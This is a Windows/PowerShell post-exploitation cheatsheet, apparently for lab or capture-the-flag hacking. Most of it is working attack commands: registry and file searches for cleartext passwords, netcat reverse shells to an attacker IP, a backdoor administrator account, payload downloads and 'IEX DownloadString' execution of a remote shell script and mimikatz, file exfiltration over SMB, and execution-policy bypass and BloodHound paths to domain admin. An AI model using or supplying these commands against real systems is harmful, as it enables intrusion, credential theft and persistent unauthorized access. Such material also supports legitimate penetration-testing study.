Windows(Powershell) Cheatsheet
=====================
work in progress

## Usefull information

- https://gist.github.com/babutzc/f68f5414fc8595ca8f80abbe36d7b946
- https://ired.team/offensive-security/code-execution/powershell-constrained-language-mode-bypass
- https://github.com/moatn/cheatsheets/blob/master/windowsstuff.md

## Information gathering

### CMD
```
whoami
echo %username%
systeminfo
hostname
net use
net view
net user
net user <username>
net user <username> /domain
net localgroup
set
findstr /C:"<autoElevate>true" 
schtasks /query /fo LIST /v | findstr "tomcat"
```

### Powershell
```
$ExecutionContext.SessionState.LanguageMode
$Env:Path
Get-volume
hostname
get-process
get-service
Get-NetFirewallRule
Get-Childitem
Get-Content
```

### Networking

```
netstat -ano
route print
```

### cleartext passwords?

```
c:\sysprep.inf
c:\sysprep\sysprep.xml
c:\unattend.xml

%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml

reg query "HKCU\Software\ORL\WinVNC3\Password"

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

## Run as

### Execute commands as a different user
Execute commands as different user when stored credentials are availeble (cmd.exe)
```
runas /user:.\username /savecred 'nc.exe -e cmd.exe 10.10.1.2 1234'
```

Execute commands as different user on powershell.
```
$username = "username"
$password = "password1"
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
$Session    = New-PSSession -Credential $Credential
Invoke-Command -Session $Session  -ScriptBlock { nc.exe -e cmd.exe 10.10.1.2  1234 }
```

### Adding users

Quickly add a user to the system. If admin privs are also acquired, add the user to the admin group. 
```
net user username password /add
net localgroup administrators username /add
```

## Downloading Files

### Kali
```
python3 -m http.server 80
```
### CMD
```
certutil -urlcache -split -f "http://10.10.14.24/mimikatz.exe" mim.exe
certutil.exe -urlcache -split -f "http://10.10.14.24/mimikatz.exe" %TMP%\mim.exe
```

### Powershell
```
powershell.exe -c (new-object System.Net.WebClient).DownloadFile('http://10.10.14.24/nc.exe','c:\temp\nc.exe')
powershell.exe -c (Start-BitsTransfer -Source "http://10.10.14.17/nc.exe -Destination C:\temp\nc.exe")
powershell.exe wget "http://10.10.14.24/nc.exe" -outfile "c:\temp\nc.exe"
IEX (new-object System.Net.WebClient).DownloadString('http://10.10.14.24/shell.ps1')
wget
curl -O http://10.10.14.24/nc.exe
powershell -c -e {base64} 
```

### SMB

Setup SMB share to copy files

#### kali
(Make sure you use the correct path to impacket)
```
python3 tools/impacket/examples/smbserver.py DAAN /tmp/DAAN
```
#### win
```
net view \\10.10.14.24
dir \\10.10.14.24\DAAN

#from attacker
copy \\10.10.14.24\DAAN\nc.exe
#to attacker
copy nc.exe \\10.10.14.24\DAAN\nc.exe
```

### Mounting shares (CMD)
```
net use Y: \\10.10.10.25\C$ /USER:username "password" /PERSISTENT:YES
net use Y: \\10.10.10.25\Users /USER:username "password" /PERSISTENT:YES
net use Y: \\10.10.10.25\Users /USER:FEEST\username "password" /PERSISTENT:YES
net use Y: \\10.10.10.25\Users /USER:.\username "password" /PERSISTENT:YES
```

## Powersploit

https://github.com/PowerShellMafia/PowerSploit
Documentation: https://powersploit.readthedocs.io/en/latest/

### PowerUp.ps1
Remove lines 1-9 as some mallware programs seem to flag this script because of these lines.

#### When the script doesn't run
Disable Execution Policy:
```
powershell -ep bypass
```
If a script will not run check for AMSI bypassing

#### Running PowerUp.ps1
```
Import-module PowerUp.ps1
. .\PowerUp.ps1

Invoke-AllChecks
```

## Bloodhound
https://github.com/BloodHoundAD/BloodHound

install on Kali
```
sudo apt-install bloodhound
```
start
```
bloodhound (in terminal)
sudo neo4j console
```
"Bolt enabled on 'ipaddress:port' "

"Remote interface available at: 'ipaddress:port"
Go to address and change the password in bolt (default password is neo4j)

On windows:
download sharphound and upload to victim
https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.exe

```
.\SharpHound.exe
```
Creates a zip, download it to Kali and drag it into BloodHound

Enum Bloodhound
- Search users you owned and mark them (rightclick "mark as owned")
- Click on the lines (right), querries > 
	- "shortest path from owned principals"
	- "shortest path to domain admins"
	- "dcsync rights"
